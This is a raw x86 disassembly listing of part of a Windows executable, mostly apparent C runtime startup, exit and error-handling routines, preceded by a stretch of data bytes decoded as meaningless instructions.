  424315:	and    BYTE PTR [ecx+ecx*1+0x26],bh
  424319:	adc    BYTE PTR [ecx],dl
  42431b:	pop    es
  42431c:	stos   DWORD PTR es:[edi],eax
  42431d:	pop    ss
  42431e:	xor    al,0x1d
  424320:	cmp    eax,0x7eeee3af
  424325:	not    DWORD PTR [eax+0x53]
  424328:	mov    eax,ds:0x22d4bbb8
  42432d:	dec    edi
  42432e:	hlt    
  42432f:	xor    DWORD PTR [edi],edx
  424331:	lods   eax,DWORD PTR ds:[esi]
  424332:	xor    BYTE PTR [ecx],bl
  424334:	and    ecx,ecx
  424336:	aam    0xd9
  424338:	adc    al,0xc7
  42433a:	add    ecx,DWORD PTR [edx-0x55efb35a]
  424340:	xor    BYTE PTR [ecx-0x47],0xa3
  424344:	sar    edx,1
  424346:	sub    DWORD PTR [esi+0x2b1a9ea2],0x364a442c
  424350:	lock iret 
  424352:	mov    ah,0xee
  424354:	js     0x4243b8
  424356:	jbe    0x4243bb
  424358:	repz pop ds
  42435a:	bound  edi,QWORD PTR [esi+0x139b3f11]
  424360:	xchg   DWORD PTR [ebp+0x5536a4a9],edi
  424366:	cvtpi2ps xmm5,QWORD PTR [ebx+0x53]
  42436a:	mov    ss,WORD PTR [edx-0x3f2fec3c]
  424370:	enter  0x9249,0x8
  424374:	dec    ebp
  424375:	ret    
  424376:	test   DWORD PTR [ebx+0x59cef145],0xc66d96c4
  424380:	inc    ebx
  424381:	nop
  424382:	inc    eax
  424383:	(bad)  
  424385:	inc    eax
  424386:	xor    ch,BYTE PTR [esi+0x65]
  424389:	jecxz  0x424396
  42438b:	mov    ecx,0x9510b02b
  424390:	mov    WORD PTR [ebp-0x43fd2570],fs
  424396:	cli    
  424397:	mov    ds:0xaae08f9d,eax
  42439c:	lock sbb BYTE PTR ds:0xa555cce2,cl
  4243a3:	or     edi,edi
  4243a5:	xor    BYTE PTR [edx+eax*1+0x5ccc8491],bh
  4243ac:	push   es
  4243ad:	and    BYTE PTR [edi+0x2b],bh
  4243b0:	loop   0x424404
  4243b2:	shr    DWORD PTR [ebx-0x78a27eae],cl
  4243b8:	gs (bad) 
  4243ba:	fsub   DWORD PTR [ecx+edi*4]
  4243bd:	xchg   BYTE PTR [eax],ah
  4243bf:	cdq    
  4243c0:	dec    esi
  4243c1:	lods   eax,DWORD PTR ds:[esi]
  4243c2:	shr    bh,cl
  4243c4:	and    BYTE PTR [eax+ecx*8+0x708173ad],ah
  4243cb:	sub    edx,edx
  4243cd:	add    edx,DWORD PTR [eax-0x5f8428e8]
  4243d3:	xchg   DWORD PTR [ebp+0x6e],ebx
  4243d6:	loopne 0x42441b
  4243d8:	and    al,BYTE PTR [ebp-0x32]
  4243db:	jle    0x424408
  4243dd:	les    edx,FWORD PTR [ecx-0xf]
  4243e0:	xor    DWORD PTR [eax+0x6e4f54ea],esi
  4243e6:	rep ins BYTE PTR es:[edi],dx
  4243e8:	pop    edi
  4243e9:	sub    BYTE PTR [esp+edi*1],bh
  4243ec:	push   cs
  4243ed:	(bad)  
  4243ee:	sti    
  4243ef:	push   edx
  4243f0:	cmp    al,0xee
  4243f2:	or     DWORD PTR [eax+0x62],ebx
  4243f5:	push   ss
  4243f6:	pop    edi
  4243f7:	pop    ebp
  4243f8:	mov    ch,0x58
  4243fa:	pop    edi
  4243fb:	arpl   dx,cx
  4243fd:	jb     0x4243ac
  4243ff:	mov    cs,WORD PTR es:[edi-0x8]
  424403:	stos   DWORD PTR es:[edi],eax
  424404:	xlat   BYTE PTR ds:[ebx]
  424405:	xchg   esi,eax
  424406:	xchg   ebx,eax
  424407:	aas    
  424408:	and    BYTE PTR [edi],ch
  42440a:	jmp    0x80ee:0x589c9a1
  424411:	and    edx,DWORD PTR [esi-0x50705f4c]
  424417:	adc    BYTE PTR [ecx-0x2e],0x4
  42441b:	mov    ch,0xcf
  42441d:	xor    dh,BYTE PTR [esi-0x29]
  424420:	fwait
  424421:	pop    ebp
  424422:	mov    ds:0x53340775,eax
  424427:	inc    ebp
  424428:	iret   
  424429:	xor    ecx,DWORD PTR [ebp+edx*8+0x5e]
  42442d:	out    dx,al
  42442e:	pop    ds
  42442f:	gs ds push ds
  424432:	jmp    0xab59efd2
  424437:	sahf   
  424438:	push   0xffffff92
  42443a:	fstp   DWORD PTR [ebx-0x3b2b8a21]
  424440:	jo     0x42444d
  424442:	int    0x49
  424444:	and    cl,BYTE PTR [ebp-0x45]
  424447:	inc    ebx
  424448:	mov    ds:0x651fd93,eax
  42444d:	int    0xe9
  42444f:	mov    eax,ds:0x39377720
  424454:	and    ebp,DWORD PTR [edi]
  424456:	xchg   ebx,eax
  424457:	loopne 0x4243e2
  424459:	mov    dl,0xad
  42445b:	adc    edx,DWORD PTR ds:0xc01aa9fc
  424461:	mov    cl,0x3a
  424463:	or     DWORD PTR [ebp-0x13a2b5da],ecx
  424469:	repnz call 0x9a7f:0xcb8c75a8
  424471:	iret   
  424472:	daa    
  424473:	mov    ah,BYTE PTR [edi-0x67]
  424476:	xchg   ebp,eax
  424477:	and    eax,0x967e9d38
  42447c:	or     BYTE PTR [ecx-0x8],al
  42447f:	and    al,bh
  424481:	pop    ebp
  424482:	ret    
  424483:	stc    
  424484:	cmp    DWORD PTR [edx-0x1c],eax
  424487:	push   esp
  424488:	mov    dl,0xc6
  42448a:	nop
  42448b:	shr    DWORD PTR [esi],cl
  42448d:	in     eax,0xfa
  42448f:	outs   dx,DWORD PTR ds:[esi]
  424490:	xchg   si,ax
  424492:	daa    
  424493:	jge    0x42449b
  424495:	popa   
  424496:	add    al,0xcb
  424498:	or     al,0xfa
  42449a:	push   cs
  42449b:	inc    esi
  42449c:	jmp    0x4244b8
  42449e:	xchg   BYTE PTR [ebp+esi*8-0x33],cl
  4244a2:	jbe    0x42450f
  4244a4:	pop    ds
  4244a5:	clc    
  4244a6:	loop   0x4244d4
  4244a8:	jl     0x42444f
  4244aa:	ret    
  4244ab:	pop    ecx
  4244ac:	ss cdq 
  4244ae:	sub    BYTE PTR [eax-0x26],bl
  4244b1:	inc    edx
  4244b2:	out    dx,al
  4244b3:	(bad)
  4244b7:	sbb    ah,dh
  4244b9:	push   edi
  4244ba:	(bad)  
  4244bc:	ret    0x5c30
  4244bf:	cdq    
  4244c0:	pushf  
  4244c1:	xchg   esp,eax
  4244c2:	pop    ss
  4244c3:	cs push 0x0
  4244c6:	push   0x0
  4244c8:	call   0x4244f0
  4244cd:	push   0xa
  4244cf:	push   0x0
  4244d1:	push   0x0
  4244d3:	call   DWORD PTR ds:0x429054
  4244d9:	xor    eax,eax
  4244db:	add    esp,0x10
  4244de:	ret    0x10
  4244e1:	nop
  4244e2:	nop
  4244e3:	nop
  4244e4:	nop
  4244e5:	nop
  4244e6:	nop
  4244e7:	nop
  4244e8:	nop
  4244e9:	nop
  4244ea:	nop
  4244eb:	nop
  4244ec:	nop
  4244ed:	nop
  4244ee:	nop
  4244ef:	nop
  4244f0:	jmp    DWORD PTR ds:0x429144
  4244f6:	jmp    DWORD PTR ds:0x429140
  4244fc:	cmp    DWORD PTR ds:0x4635bc,0x1
  424503:	jne    0x42450a
  424505:	call   0x424a48
  42450a:	push   DWORD PTR [esp+0x4]
  42450e:	call   0x4248d1
  424513:	push   0xff
  424518:	call   DWORD PTR ds:0x462cb4
  42451e:	pop    ecx
  42451f:	pop    ecx
  424520:	ret    
  424521:	cmp    DWORD PTR ds:0x4635bc,0x1
  424528:	jne    0x42452f
  42452a:	call   0x424a48
  42452f:	push   DWORD PTR [esp+0x4]
  424533:	call   0x4248d1
  424538:	push   0xff
  42453d:	call   0x424717
  424542:	pop    ecx
  424543:	pop    ecx
  424544:	ret    
  424545:	push   0x60
  424547:	push   0x429268
  42454c:	call   0x425434
  424551:	mov    edi,0x94
  424556:	mov    eax,edi
  424558:	call   0x425480
  42455d:	mov    DWORD PTR [ebp-0x18],esp
  424560:	mov    esi,esp
  424562:	mov    DWORD PTR [esi],edi
  424564:	push   esi
  424565:	call   DWORD PTR ds:0x429098
  42456b:	mov    ecx,DWORD PTR [esi+0x10]
  42456e:	mov    DWORD PTR ds:0x4635c4,ecx
  424574:	mov    eax,DWORD PTR [esi+0x4]
  424577:	mov    ds:0x4635d0,eax
  42457c:	mov    edx,DWORD PTR [esi+0x8]
  42457f:	mov    DWORD PTR ds:0x4635d4,edx
  424585:	mov    esi,DWORD PTR [esi+0xc]
  424588:	and    esi,0x7fff
  42458e:	mov    DWORD PTR ds:0x4635c8,esi
  424594:	cmp    ecx,0x2
  424597:	je     0x4245a5
  424599:	or     esi,0x8000
  42459f:	mov    DWORD PTR ds:0x4635c8,esi
  4245a5:	shl    eax,0x8
  4245a8:	add    eax,edx
  4245aa:	mov    ds:0x4635cc,eax
  4245af:	xor    esi,esi
  4245b1:	push   esi
  4245b2:	mov    edi,DWORD PTR ds:0x42902c
  4245b8:	call   edi
  4245ba:	cmp    WORD PTR [eax],0x5a4d
  4245bf:	jne    0x4245e0
  4245c1:	mov    ecx,DWORD PTR [eax+0x3c]
  4245c4:	add    ecx,eax
  4245c6:	cmp    DWORD PTR [ecx],0x4550
  4245cc:	jne    0x4245e0
  4245ce:	movzx  eax,WORD PTR [ecx+0x18]
  4245d2:	cmp    eax,0x10b
  4245d7:	je     0x4245f8
  4245d9:	cmp    eax,0x20b
  4245de:	je     0x4245e5
  4245e0:	mov    DWORD PTR [ebp-0x1c],esi
  4245e3:	jmp    0x42460c
  4245e5:	cmp    DWORD PTR [ecx+0x84],0xe
  4245ec:	jbe    0x4245e0
  4245ee:	xor    eax,eax
  4245f0:	cmp    DWORD PTR [ecx+0xf8],esi
  4245f6:	jmp    0x424606
  4245f8:	cmp    DWORD PTR [ecx+0x74],0xe
  4245fc:	jbe    0x4245e0
  4245fe:	xor    eax,eax
  424600:	cmp    DWORD PTR [ecx+0xe8],esi
  424606:	setne  al
  424609:	mov    DWORD PTR [ebp-0x1c],eax
  42460c:	push   0x1
  42460e:	call   0x4253e3
  424613:	pop    ecx
  424614:	test   eax,eax
  424616:	jne    0x424620
  424618:	push   0x1c
  42461a:	call   0x424521
  42461f:	pop    ecx
  424620:	call   0x42535a
  424625:	test   eax,eax
  424627:	jne    0x424631
  424629:	push   0x10
  42462b:	call   0x424521
  424630:	pop    ecx
  424631:	call   0x425243
  424636:	mov    DWORD PTR [ebp-0x4],esi
  424639:	call   0x425045
  42463e:	test   eax,eax
  424640:	jge    0x42464a
  424642:	push   0x1b
  424644:	call   0x4244fc
  424649:	pop    ecx
  42464a:	call   DWORD PTR ds:0x429094
  424650:	mov    ds:0x463d74,eax
  424655:	call   0x424f23
  42465a:	mov    ds:0x4635b4,eax
  42465f:	call   0x424e81
  424664:	test   eax,eax
  424666:	jge    0x424670
  424668:	push   0x8
  42466a:	call   0x4244fc
  42466f:	pop    ecx
  424670:	call   0x424c4e
  424675:	test   eax,eax
  424677:	jge    0x424681
  424679:	push   0x9
  42467b:	call   0x4244fc
  424680:	pop    ecx
  424681:	call   0x424759
  424686:	mov    DWORD PTR [ebp-0x20],eax
  424689:	cmp    eax,esi
  42468b:	je     0x424694
  42468d:	push   eax
  42468e:	call   0x4244fc
  424693:	pop    ecx
  424694:	mov    DWORD PTR [ebp-0x38],esi
  424697:	lea    eax,[ebp-0x64]
  42469a:	push   eax
  42469b:	call   DWORD PTR ds:0x429090
  4246a1:	call   0x424be5
  4246a6:	mov    DWORD PTR [ebp-0x68],eax
  4246a9:	test   BYTE PTR [ebp-0x38],0x1
  4246ad:	je     0x4246b5
  4246af:	movzx  eax,WORD PTR [ebp-0x34]
  4246b3:	jmp    0x4246b8
  4246b5:	push   0xa
  4246b7:	pop    eax
  4246b8:	push   eax
  4246b9:	push   DWORD PTR [ebp-0x68]
  4246bc:	push   esi
  4246bd:	push   esi
  4246be:	call   edi
  4246c0:	push   eax
  4246c1:	call   0x423030
  4246c6:	mov    edi,eax
  4246c8:	mov    DWORD PTR [ebp-0x6c],edi
  4246cb:	cmp    DWORD PTR [ebp-0x1c],esi
  4246ce:	jne    0x4246d6
  4246d0:	push   edi
  4246d1:	call   0x424891
  4246d6:	call   0x4248b3
  4246db:	jmp    0x424708
  4246dd:	mov    eax,DWORD PTR [ebp-0x14]
  4246e0:	mov    ecx,DWORD PTR [eax]
  4246e2:	mov    ecx,DWORD PTR [ecx]
  4246e4:	mov    DWORD PTR [ebp-0x70],ecx
  4246e7:	push   eax
  4246e8:	push   ecx
  4246e9:	call   0x424a81
  4246ee:	pop    ecx
  4246ef:	pop    ecx
  4246f0:	ret    
  4246f1:	mov    esp,DWORD PTR [ebp-0x18]
  4246f4:	mov    edi,DWORD PTR [ebp-0x70]
  4246f7:	cmp    DWORD PTR [ebp-0x1c],0x0
  4246fb:	jne    0x424703
  4246fd:	push   edi
  4246fe:	call   0x4248a2
  424703:	call   0x4248c2
  424708:	or     DWORD PTR [ebp-0x4],0xffffffff
  42470c:	mov    eax,edi
  42470e:	lea    esp,[ebp-0x7c]
  424711:	call   0x42546f
  424716:	ret    
  424717:	push   0x429284
  42471c:	call   DWORD PTR ds:0x42902c
  424722:	test   eax,eax
  424724:	je     0x42473c
  424726:	push   0x429274
  42472b:	push   eax
  42472c:	call   DWORD PTR ds:0x429028
  424732:	test   eax,eax
  424734:	je     0x42473c
  424736:	push   DWORD PTR [esp+0x4]
  42473a:	call   eax
  42473c:	push   DWORD PTR [esp+0x4]
  424740:	call   DWORD PTR ds:0x42909c
  424746:	int3   
  424747:	push   0x8
  424749:	call   0x4255ef
  42474e:	pop    ecx
  42474f:	ret    
  424750:	push   0x8
  424752:	call   0x42555b
  424757:	pop    ecx
  424758:	ret    
  424759:	mov    eax,ds:0x463d70
  42475e:	test   eax,eax
  424760:	je     0x424764
  424762:	call   eax
  424764:	push   esi
  424765:	push   edi
  424766:	mov    ecx,0x42b00c
  42476b:	mov    edi,0x42b018
  424770:	xor    eax,eax
  424772:	cmp    ecx,edi
  424774:	mov    esi,ecx
  424776:	jae    0x42478f
  424778:	test   eax,eax
  42477a:	jne    0x4247bb
  42477c:	mov    ecx,DWORD PTR [esi]
  42477e:	test   ecx,ecx
  424780:	je     0x424784
  424782:	call   ecx
  424784:	add    esi,0x4
  424787:	cmp    esi,edi
  424789:	jb     0x424778
  42478b:	test   eax,eax
  42478d:	jne    0x4247bb
  42478f:	push   0x425287
  424794:	call   0x425700
  424799:	mov    esi,0x42b000
  42479e:	mov    eax,esi
  4247a0:	mov    edi,0x42b008
  4247a5:	cmp    eax,edi
  4247a7:	pop    ecx
  4247a8:	jae    0x4247b9
  4247aa:	mov    eax,DWORD PTR [esi]
  4247ac:	test   eax,eax
  4247ae:	je     0x4247b2
  4247b0:	call   eax
  4247b2:	add    esi,0x4
  4247b5:	cmp    esi,edi
  4247b7:	jb     0x4247aa
  4247b9:	xor    eax,eax
  4247bb:	pop    edi
  4247bc:	pop    esi
  4247bd:	ret    
  4247be:	push   ebp
  4247bf:	mov    ebp,esp
  4247c1:	push   esi
  4247c2:	push   edi
  4247c3:	push   0x8
  4247c5:	call   0x4255ef
  4247ca:	xor    esi,esi
  4247cc:	inc    esi
  4247cd:	cmp    DWORD PTR ds:0x463604,esi
  4247d3:	pop    ecx
  4247d4:	jne    0x4247e6
  4247d6:	push   DWORD PTR [ebp+0x8]
  4247d9:	call   DWORD PTR ds:0x429064
  4247df:	push   eax
  4247e0:	call   DWORD PTR ds:0x4290a0
  4247e6:	cmp    DWORD PTR [ebp+0xc],0x0
  4247ea:	mov    al,BYTE PTR [ebp+0x10]
  4247ed:	mov    DWORD PTR ds:0x463600,esi
  4247f3:	mov    ds:0x4635fc,al
  4247f8:	jne    0x42484c
  4247fa:	mov    ecx,DWORD PTR ds:0x463d68
  424800:	test   ecx,ecx
  424802:	je     0x42482d
  424804:	mov    eax,ds:0x463d64
  424809:	sub    eax,0x4
  42480c:	cmp    eax,ecx
  42480e:	jmp    0x424826
  424810:	mov    eax,DWORD PTR [eax]
  424812:	test   eax,eax
  424814:	je     0x424818
  424816:	call   eax
  424818:	mov    eax,ds:0x463d64
  42481d:	sub    eax,0x4
  424820:	cmp    eax,DWORD PTR ds:0x463d68
  424826:	mov    ds:0x463d64,eax
  42482b:	jae    0x424810
  42482d:	mov    eax,0x42b01c
  424832:	mov    esi,0x42b020
  424837:	cmp    eax,esi
  424839:	mov    edi,eax
  42483b:	jae    0x42484c
  42483d:	mov    eax,DWORD PTR [edi]
  42483f:	test   eax,eax
  424841:	je     0x424845
  424843:	call   eax
  424845:	add    edi,0x4
  424848:	cmp    edi,esi
  42484a:	jb     0x42483d
  42484c:	mov    eax,0x42b024
  424851:	mov    esi,0x42b028
  424856:	cmp    eax,esi
  424858:	mov    edi,eax
  42485a:	jae    0x42486b
  42485c:	mov    eax,DWORD PTR [edi]
  42485e:	test   eax,eax
  424860:	je     0x424864
  424862:	call   eax
  424864:	add    edi,0x4
  424867:	cmp    edi,esi
  424869:	jb     0x42485c
  42486b:	cmp    DWORD PTR [ebp+0x10],0x0
  42486f:	pop    edi
  424870:	pop    esi
  424871:	je     0x42487c
  424873:	push   0x8
  424875:	call   0x42555b
  42487a:	jmp    0x42488e
  42487c:	push   DWORD PTR [ebp+0x8]
  42487f:	mov    DWORD PTR ds:0x463604,0x1
  424889:	call   0x424717
  42488e:	pop    ecx
  42488f:	pop    ebp
  424890:	ret    
  424891:	push   0x0
  424893:	push   0x0
  424895:	push   DWORD PTR [esp+0xc]
  424899:	call   0x4247be
  42489e:	add    esp,0xc
  4248a1:	ret    
  4248a2:	push   0x0
  4248a4:	push   0x1
  4248a6:	push   DWORD PTR [esp+0xc]
  4248aa:	call   0x4247be
  4248af:	add    esp,0xc
  4248b2:	ret    
  4248b3:	push   0x1
  4248b5:	push   0x0
  4248b7:	push   0x0
  4248b9:	call   0x4247be
  4248be:	add    esp,0xc
  4248c1:	ret    
  4248c2:	push   0x1
  4248c4:	push   0x1
  4248c6:	push   0x0
  4248c8:	call   0x4247be
  4248cd:	add    esp,0xc
  4248d0:	ret    
  4248d1:	push   ebp
  4248d2:	mov    ebp,esp
  4248d4:	sub    esp,0x10c
  4248da:	mov    eax,ds:0x462f30
  4248df:	xor    eax,DWORD PTR [ebp+0x4]
  4248e2:	mov    ecx,DWORD PTR [ebp+0x8]
  4248e5:	push   ebx
  4248e6:	push   esi
  4248e7:	mov    DWORD PTR [ebp-0x4],eax
  4248ea:	xor    edx,edx
  4248ec:	push   edi
  4248ed:	xor    eax,eax
  4248ef:	cmp    ecx,DWORD PTR [eax*8+0x462cc0]
  4248f6:	je     0x4248fe
  4248f8:	inc    eax
  4248f9:	cmp    eax,0x12
  4248fc:	jb     0x4248ef
  4248fe:	mov    esi,eax
  424900:	shl    esi,0x3
  424903:	cmp    ecx,DWORD PTR [esi+0x462cc0]
  424909:	jne    0x424a32
  42490f:	mov    eax,ds:0x4635bc
  424914:	cmp    eax,0x1
  424917:	je     0x424a0d
  42491d:	cmp    eax,edx
  42491f:	jne    0x42492e
  424921:	cmp    DWORD PTR ds:0x462cb8,0x1
  424928:	je     0x424a0d
  42492e:	cmp    ecx,0xfc
  424934:	je     0x424a32
  42493a:	push   0x104
  42493f:	lea    eax,[ebp-0x10c]
  424945:	push   eax
  424946:	push   edx
  424947:	mov    BYTE PTR [ebp-0x8],dl
  42494a:	call   DWORD PTR ds:0x4290a8
  424950:	test   eax,eax
  424952:	jne    0x424967
  424954:	lea    eax,[ebp-0x10c]
  42495a:	push   0x4295dc
  42495f:	push   eax
  424960:	call   0x425810
  424965:	pop    ecx
  424966:	pop    ecx
  424967:	lea    eax,[ebp-0x10c]
  42496d:	push   eax
  42496e:	lea    edi,[ebp-0x10c]
  424974:	call   0x425a40
  424979:	inc    eax
  42497a:	cmp    eax,0x3c
  42497d:	pop    ecx
  42497e:	jbe    0x4249a9
  424980:	lea    eax,[ebp-0x10c]
  424986:	push   eax
  424987:	call   0x425a40
  42498c:	mov    edi,eax
  42498e:	lea    eax,[ebp-0x10c]
  424994:	sub    eax,0x3b
  424997:	push   0x3
  424999:	add    edi,eax
  42499b:	push   0x4295d8
  4249a0:	push   edi
  4249a1:	call   0x425910
  4249a6:	add    esp,0x10
  4249a9:	push   edi
  4249aa:	call   0x425a40
  4249af:	push   DWORD PTR [esi+0x462cc4]
  4249b5:	mov    ebx,eax
  4249b7:	call   0x425a40
  4249bc:	lea    eax,[ebx+eax*1+0x1c]
  4249c0:	pop    ecx
  4249c1:	add    eax,0x3
  4249c4:	pop    ecx
  4249c5:	and    eax,0xfffffffc
  4249c8:	call   0x425480
  4249cd:	mov    ebx,esp
  4249cf:	push   0x4295bc
  4249d4:	push   ebx
  4249d5:	call   0x425810
  4249da:	push   edi
  4249db:	push   ebx
  4249dc:	call   0x425820
  4249e1:	push   0x4295b8
  4249e6:	push   ebx
  4249e7:	call   0x425820
  4249ec:	push   DWORD PTR [esi+0x462cc4]
  4249f2:	push   ebx
  4249f3:	call   0x425820
  4249f8:	push   0x12010
  4249fd:	push   0x429590
  424a02:	push   ebx
  424a03:	call   0x425712
  424a08:	add    esp,0x2c
  424a0b:	jmp    0x424a32
  424a0d:	push   edx
  424a0e:	lea    eax,[ebp+0x8]
  424a11:	push   eax
  424a12:	lea    esi,[esi+0x462cc4]
  424a18:	push   DWORD PTR [esi]
  424a1a:	call   0x425a40
  424a1f:	pop    ecx
  424a20:	push   eax
  424a21:	push   DWORD PTR [esi]
  424a23:	push   0xfffffff4
  424a25:	call   DWORD PTR ds:0x4290a4
  424a2b:	push   eax
  424a2c:	call   DWORD PTR ds:0x429080
  424a32:	lea    esp,[ebp-0x118]
  424a38:	mov    ecx,DWORD PTR [ebp-0x4]
  424a3b:	xor    ecx,DWORD PTR [ebp+0x4]
  424a3e:	call   0x425afc
  424a43:	pop    edi
  424a44:	pop    esi
  424a45:	pop    ebx
  424a46:	leave  
  424a47:	ret    
  424a48:	mov    eax,ds:0x4635bc
  424a4d:	cmp    eax,0x1
  424a50:	je     0x424a5f
  424a52:	test   eax,eax
  424a54:	jne    0x424a80
  424a56:	cmp    DWORD PTR ds:0x462cb8,0x1
  424a5d:	jne    0x424a80
  424a5f:	push   0xfc
  424a64:	call   0x4248d1
  424a69:	mov    eax,ds:0x463608
  424a6e:	test   eax,eax
  424a70:	pop    ecx
  424a71:	je     0x424a75
  424a73:	call   eax
  424a75:	push   0xff
  424a7a:	call   0x4248d1
  424a7f:	pop    ecx
  424a80:	ret    
  424a81:	push   ebp
  424a82:	mov    ebp,esp
  424a84:	push   ecx
  424a85:	push   ebx
  424a86:	push   esi
  424a87:	push   edi
  424a88:	call   0x4252e9
  424a8d:	mov    edi,DWORD PTR [ebp+0x8]
  424a90:	mov    esi,eax
  424a92:	mov    edx,DWORD PTR [esi+0x54]
  424a95:	mov    eax,ds:0x462dd4
  424a9a:	mov    ecx,edx
  424a9c:	cmp    DWORD PTR [ecx],edi
  424a9e:	je     0x424aad
  424aa0:	lea    ebx,[eax+eax*2]
  424aa3:	add    ecx,0xc
  424aa6:	lea    ebx,[edx+ebx*4]
  424aa9:	cmp    ecx,ebx
  424aab:	jb     0x424a9c
  424aad:	lea    eax,[eax+eax*2]
  424ab0:	lea    eax,[edx+eax*4]
  424ab3:	cmp    ecx,eax
  424ab5:	jae    0x424abb
  424ab7:	cmp    DWORD PTR [ecx],edi
  424ab9:	je     0x424abd
  424abb:	xor    ecx,ecx
  424abd:	test   ecx,ecx
  424abf:	je     0x424bd7
  424ac5:	mov    ebx,DWORD PTR [ecx+0x8]
  424ac8:	test   ebx,ebx
  424aca:	mov    DWORD PTR [ebp+0x8],ebx
  424acd:	je     0x424bd7
  424ad3:	cmp    ebx,0x5
  424ad6:	jne    0x424ae4
  424ad8:	and    DWORD PTR [ecx+0x8],0x0
  424adc:	xor    eax,eax
  424ade:	inc    eax
  424adf:	jmp    0x424be0
  424ae4:	cmp    ebx,0x1
  424ae7:	je     0x424bd2
  424aed:	mov    eax,DWORD PTR [esi+0x58]
  424af0:	mov    DWORD PTR [ebp-0x4],eax
  424af3:	mov    eax,DWORD PTR [ebp+0xc]
  424af6:	mov    DWORD PTR [esi+0x58],eax
  424af9:	mov    eax,DWORD PTR [ecx+0x4]
  424afc:	cmp    eax,0x8
  424aff:	jne    0x424bc4
  424b05:	mov    edx,DWORD PTR ds:0x462dc8
  424b0b:	mov    eax,ds:0x462dcc
  424b10:	add    eax,edx
  424b12:	cmp    edx,eax
  424b14:	jge    0x424b3d
  424b16:	lea    eax,[edx+edx*2]
  424b19:	shl    eax,0x2
  424b1c:	mov    edi,DWORD PTR [esi+0x54]
  424b1f:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424b24:	mov    edi,DWORD PTR ds:0x462dc8
  424b2a:	mov    ebx,DWORD PTR ds:0x462dcc
  424b30:	inc    edx
  424b31:	add    ebx,edi
  424b33:	add    eax,0xc
  424b36:	cmp    edx,ebx
  424b38:	jl     0x424b1c
  424b3a:	mov    ebx,DWORD PTR [ebp+0x8]
  424b3d:	mov    ecx,DWORD PTR [ecx]
  424b3f:	cmp    ecx,0xc000008e
  424b45:	mov    edi,DWORD PTR [esi+0x5c]
  424b48:	jne    0x424b53
  424b4a:	mov    DWORD PTR [esi+0x5c],0x83
  424b51:	jmp    0x424bb7
  424b53:	cmp    ecx,0xc0000090
  424b59:	jne    0x424b64
  424b5b:	mov    DWORD PTR [esi+0x5c],0x81
  424b62:	jmp    0x424bb7
  424b64:	cmp    ecx,0xc0000091
  424b6a:	jne    0x424b75
  424b6c:	mov    DWORD PTR [esi+0x5c],0x84
  424b73:	jmp    0x424bb7
  424b75:	cmp    ecx,0xc0000093
  424b7b:	jne    0x424b86
  424b7d:	mov    DWORD PTR [esi+0x5c],0x85
  424b84:	jmp    0x424bb7
  424b86:	cmp    ecx,0xc000008d
  424b8c:	jne    0x424b97
  424b8e:	mov    DWORD PTR [esi+0x5c],0x82
  424b95:	jmp    0x424bb7
  424b97:	cmp    ecx,0xc000008f
  424b9d:	jne    0x424ba8
  424b9f:	mov    DWORD PTR [esi+0x5c],0x86
  424ba6:	jmp    0x424bb7
  424ba8:	cmp    ecx,0xc0000092
  424bae:	jne    0x424bb7
  424bb0:	mov    DWORD PTR [esi+0x5c],0x8a
  424bb7:	push   DWORD PTR [esi+0x5c]
  424bba:	push   0x8
  424bbc:	call   ebx
  424bbe:	pop    ecx
  424bbf:	mov    DWORD PTR [esi+0x5c],edi
  424bc2:	jmp    0x424bcb
  424bc4:	and    DWORD PTR [ecx+0x8],0x0
  424bc8:	push   eax
  424bc9:	call   ebx
  424bcb:	mov    eax,DWORD PTR [ebp-0x4]
  424bce:	pop    ecx
  424bcf:	mov    DWORD PTR [esi+0x58],eax
  424bd2:	or     eax,0xffffffff
  424bd5:	jmp    0x424be0
  424bd7:	push   DWORD PTR [ebp+0xc]
  424bda:	call   DWORD PTR ds:0x4290ac
  424be0:	pop    edi
  424be1:	pop    esi
  424be2:	pop    ebx
  424be3:	leave  
  424be4:	ret    
  424be5:	cmp    DWORD PTR ds:0x463d6c,0x0
  424bec:	jne    0x424bf3
  424bee:	call   0x42601c
  424bf3:	push   esi
  424bf4:	mov    esi,DWORD PTR ds:0x463d74
  424bfa:	test   esi,esi
  424bfc:	jne    0x424c05
  424bfe:	mov    esi,0x4295f3
  424c03:	jmp    0x424c4a
  424c05:	mov    al,BYTE PTR [esi]
  424c07:	cmp    al,0x22
  424c09:	jne    0x424c33
  424c0b:	inc    esi
  424c0c:	mov    al,BYTE PTR [esi]
  424c0e:	cmp    al,0x22
  424c10:	je     0x424c43
  424c12:	test   al,al
  424c14:	je     0x424c2c
  424c16:	movzx  eax,al
  424c19:	push   eax
  424c1a:	call   0x425b3b
  424c1f:	test   eax,eax
  424c21:	pop    ecx
  424c22:	je     0x424c25
  424c24:	inc    esi
  424c25:	inc    esi
  424c26:	mov    al,BYTE PTR [esi]
  424c28:	cmp    al,0x22
  424c2a:	jne    0x424c12
  424c2c:	cmp    BYTE PTR [esi],0x22
  424c2f:	jne    0x424c44
  424c31:	jmp    0x424c43
  424c33:	cmp    al,0x20
  424c35:	jbe    0x424c44
  424c37:	inc    esi
  424c38:	cmp    BYTE PTR [esi],0x20
  424c3b:	ja     0x424c37
  424c3d:	jmp    0x424c44
  424c3f:	cmp    al,0x20
  424c41:	ja     0x424c4a
  424c43:	inc    esi
  424c44:	mov    al,BYTE PTR [esi]
  424c46:	test   al,al
  424c48:	jne    0x424c3f
  424c4a:	mov    eax,esi
  424c4c:	pop    esi
  424c4d:	ret    
  424c4e:	push   ebx
  424c4f:	xor    ebx,ebx
  424c51:	cmp    DWORD PTR ds:0x463d6c,ebx
  424c57:	push   esi
  424c58:	push   edi
  424c59:	jne    0x424c60
  424c5b:	call   0x42601c
  424c60:	mov    esi,DWORD PTR ds:0x4635b4
  424c66:	xor    edi,edi
  424c68:	cmp    esi,ebx
  424c6a:	jne    0x424c7e
  424c6c:	jmp    0x424c9e
  424c6e:	cmp    al,0x3d
  424c70:	je     0x424c73
  424c72:	inc    edi
  424c73:	push   esi
  424c74:	call   0x425a40
  424c79:	pop    ecx
  424c7a:	lea    esi,[esi+eax*1+0x1]
  424c7e:	mov    al,BYTE PTR [esi]
  424c80:	cmp    al,bl
  424c82:	jne    0x424c6e
  424c84:	lea    eax,[edi*4+0x4]
  424c8b:	push   eax
  424c8c:	call   0x426152
  424c91:	mov    edi,eax
  424c93:	cmp    edi,ebx
  424c95:	pop    ecx
  424c96:	mov    DWORD PTR ds:0x4635e4,edi
  424c9c:	jne    0x424ca3
  424c9e:	or     eax,0xffffffff
  424ca1:	jmp    0x424cfb
  424ca3:	mov    esi,DWORD PTR ds:0x4635b4
  424ca9:	push   ebp
  424caa:	jmp    0x424cd6
